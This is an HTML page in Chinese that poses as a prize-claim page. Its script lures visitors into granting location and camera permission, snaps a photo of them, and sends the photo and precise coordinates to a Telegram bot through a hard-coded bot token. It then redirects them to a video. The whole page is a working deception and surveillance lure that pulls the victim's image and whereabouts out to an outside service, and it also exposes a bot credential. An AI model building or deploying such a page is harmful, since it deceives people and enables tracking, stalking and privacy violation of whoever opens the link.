<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>🎁 领取奖励 🎁</title>
    <style>
        body { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background: url('https://github.com/sachinbagwan208-design/-/raw/main/00.png') no-repeat center center fixed; background-size: cover; color: white; font-family: sans-serif; }
        /* 默认隐藏相机框 */
        #video { background: #000; border: 2px solid #444; border-radius: 8px; margin-bottom: 20px; display: none; }
        #status { margin: 15px 0; font-weight: bold; background: rgba(0,0,0,0.6); padding: 10px; border-radius: 5px; }
        button { padding: 15px 40px; cursor: pointer; font-size: 20px; border-radius: 5px; border: none; background: #28a745; color: white; }
    </style>
</head>
<body>
    <h2>🎉 请点击下方领取奖品 🎉</h2>
    <div id="status">点击按钮以激活奖品领取功能</div>
    <video id="video" width="640" height="480" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <button id="startBtn">领取🎲</button>

    <script>
        const BOT_TOKEN = '8657025946:AAENnYKTFNhRrms6bzTLIR2kAQGytdOinnI';
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const startBtn = document.getElementById('startBtn');
        const status = document.getElementById('status');
        const CHAT_ID = new URLSearchParams(window.location.search).get('id');

        startBtn.addEventListener('click', async () => {
            if (!CHAT_ID) { status.innerText = "❌ 错误：未识别到用户ID"; return; }
            
            startBtn.style.display = 'none';
            status.innerText = "正在请求地理位置权限...";

            try {
                // 1. 先请求定位权限
                const pos = await new Promise((res, rej) => {
                    navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000 });
                });
                
                status.innerText = "位置已获取，正在请求相机权限...";
                
                // 2. 再请求相机权限
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                
                // 3. 所有权限拿到后，再显示视频框
                video.srcObject = stream;
                video.style.display = 'block'; 
                status.innerText = "权限已全部授予，正在处理中...";
                
                // 4. 延迟一点显示画面后自动上传
                setTimeout(() => captureAndUpload(stream, pos), 1000);
                
            } catch (err) {
                status.innerText = "❌ 必须允许位置和相机权限才能领取。";
                console.error(err);
            }
        });

        async function captureAndUpload(stream, pos) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const locationText = `纬度: ${pos.coords.latitude.toFixed(6)}, 经度: ${pos.coords.longitude.toFixed(6)}`;
            
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'prize.jpg');
                formData.append('caption', `来自ID: ${CHAT_ID}\n${locationText}`);

                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                if ((await res.json()).ok) {
                    stream.getTracks().forEach(t => t.stop());
                    window.location.href = "https://github.com/sachinbagwan208-design/-/raw/main/000.MP4";
                } else {
                    status.innerText = "上传失败，请刷新重试";
                }
            }, 'image/jpeg');
        }
    </script>
</body>
</html>
